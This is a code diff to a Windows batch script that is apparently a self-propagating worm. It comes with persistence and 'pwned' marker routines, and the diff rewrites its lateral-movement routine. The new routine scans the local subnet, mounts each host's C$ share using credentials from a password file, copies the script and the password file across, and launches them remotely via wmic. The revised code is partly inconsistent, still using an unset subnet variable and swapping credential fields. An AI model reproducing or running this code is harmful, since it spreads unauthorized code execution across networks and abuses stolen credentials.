@@ -48,7 +48,7 @@ if %errorlevel% equ 0 (
 	call :add_marker
 	call :add_persistence
 	call :execute_action
-	call :connect_sub_targets
+	call :connect_targets
 )
 exit /b 0
 
@@ -57,14 +57,14 @@ exit /b 0
 call :add_marker
 call :add_persistence
 call :execute_action
-call :connect_sub_targets
+call :connect_targets
 exit /b 0
 
 
 :seq3
 ::prop persistence sequence
 call :execute_action
-call :connect_sub_targets
+call :connect_targets
 exit /b 0
 
 
@@ -116,40 +116,25 @@ echo %COMPUTERNAME% has been pwned. > C:\pwned.txt
 :: ---------------
 exit /b 0
 
-
-:connect_smb_targets
+:connect_targets
 setlocal enabledelayedexpansion
-:: find targets connected with port 445
+:: find targets on specific subnet - no chance of spreading elsewhere.
 :: Propagates and executes payload and password file to remote hosts
-for /l %%q in (0,1,255) do (
-	for /f "tokens=1-10 delims=.: " %%a in ('"netstat -anop tcp | findstr :445 | findstr -v 0.0.0.0"') do (
-		ping 192.168.%%i.%%q /n 2 /w 1000 |findstr Reply | findstr -v unreachable
-		if !errorlevel! equ 0 for /f "tokens=1-3 delims=\ " %%x in (%ldir%\dapw) do (
-			net use \\192.168.%%i.%%q\c$ /user:%%y %%z /persistent: yes
-			copy /y "%ldir%\main.bat" "\\192.168.%%i.%%q\c$\Windows\Temp\main.bat"
-			copy /y "%ldir%\dapw" "\\192.168.%%i.%%q\c$\Windows\Temp\dapw"
-			net use /del \\192.168.%%i.%%q\c$
-			wmic /node:192.168.%%i.%%q /user:%%y /password:%%z process call create "cmd /c %ldir%\main.bat"
-		)
-	)
+:: get current IP subnet info
+for /f "tokens=1-20 delims=. " %%a in ('"ipconfig | findstr /c:"IPv4""') do (
+	set oc1=%%d
+	set oc2=%%e
+	set oc3=%%f
 )
-endlocal
-exit /b 0
 
-:connect_sub_targets
-setlocal enabledelayedexpansion
-:: find targets on specified subnet
-:: Propagates and executes payload and password file to remote hosts
-:: set targeted subnet
-set sub=10
 for /l %%q in (0,1,255) do (
-	ping 192.168.%sub%.%%q /n 2 /w 500 |findstr Reply | findstr -v unreachable
+	ping %oc1%.%oc2%.%oc3%.%%q /n 2 /w 500 |findstr Reply | findstr -v unreachable
 	if !errorlevel! equ 0 for /f "tokens=1-2 delims= " %%x in (%ldir%\dapw) do (
-		net use \\192.168.%sub%.%%q\c$ /user:%%y %%z /persistent: yes
-		copy /y "%ldir%\main.bat" "\\192.168.%sub%.%%q\c$\Windows\Temp\main.bat"
-		copy /y "%ldir%\dapw" "\\192.168.%sub%.%%q\c$\Windows\Temp\dapw"
-		net use /del \\192.168.%sub%.%%q\c$
-		wmic /node:192.168.%sub%.%%q /user:%%x /password:%%y process call create "cmd /c %ldir%\main.bat"
+		net use \\%oc1%.%oc2%.%sub%.%%q\c$ /user:%%y %%z /persistent: yes
+		copy /y "%ldir%\main.bat" "\\%oc1%.%oc2%.%sub%.%%q\c$\Windows\Temp\main.bat"
+		copy /y "%ldir%\dapw" "\\%oc1%.%oc2%.%sub%.%%q\c$\Windows\Temp\dapw"
+		net use /del \\%oc1%.%oc2%.%sub%.%%q\c$
+		wmic /node:%oc1%.%oc2%.%sub%.%%q /user:%%x /password:%%y process call create "cmd /c %ldir%\main.bat"
 	)
 )
 endlocal
